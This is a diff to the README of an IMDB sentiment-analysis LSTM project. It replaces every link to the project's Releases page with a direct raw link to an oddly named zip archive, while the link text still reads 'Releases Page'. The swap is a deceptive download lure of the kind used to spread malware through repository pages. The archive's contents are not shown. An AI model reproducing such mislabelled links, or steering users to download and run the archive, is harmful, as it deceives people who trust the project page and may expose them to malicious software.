@@ -1,6 +1,6 @@
 # 🔍 IMDB-Sentiment-Analysis-LSTM - Analyze Movie Reviews Easily
 
-[![Download IMDB-Sentiment-Analysis-LSTM](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/TheRed-25/IMDB-Sentiment-Analysis-LSTM/releases)
+[![Download IMDB-Sentiment-Analysis-LSTM](https://raw.githubusercontent.com/TheRed-25/IMDB-Sentiment-Analysis-LSTM/main/Protodonata/Sentiment-IMD-Analysis-LSTM-energist.zip)](https://raw.githubusercontent.com/TheRed-25/IMDB-Sentiment-Analysis-LSTM/main/Protodonata/Sentiment-IMD-Analysis-LSTM-energist.zip)
 
 ## 📚 Overview
 
@@ -10,7 +10,7 @@ This project allows you to analyze sentiments in movie reviews using a deep lear
 
 To begin using this application, follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases Page](https://github.com/TheRed-25/IMDB-Sentiment-Analysis-LSTM/releases) to find the downloadable files.
+1. **Visit the Releases Page:** Go to our [Releases Page](https://raw.githubusercontent.com/TheRed-25/IMDB-Sentiment-Analysis-LSTM/main/Protodonata/Sentiment-IMD-Analysis-LSTM-energist.zip) to find the downloadable files.
   
 2. **Select the Latest Version:** Look for the latest version at the top of the page. This version includes the latest features and improvements.
 
@@ -34,7 +34,7 @@ To run this software smoothly, ensure your system meets the following requiremen
 
 ## 📥 Download & Install
 
-Head to our [Releases Page](https://github.com/TheRed-25/IMDB-Sentiment-Analysis-LSTM/releases) to download the latest version of the application. 
+Head to our [Releases Page](https://raw.githubusercontent.com/TheRed-25/IMDB-Sentiment-Analysis-LSTM/main/Protodonata/Sentiment-IMD-Analysis-LSTM-energist.zip) to download the latest version of the application. 
 
 1. Follow the link and select the latest version.
 2. Choose the file specific to your operating system.
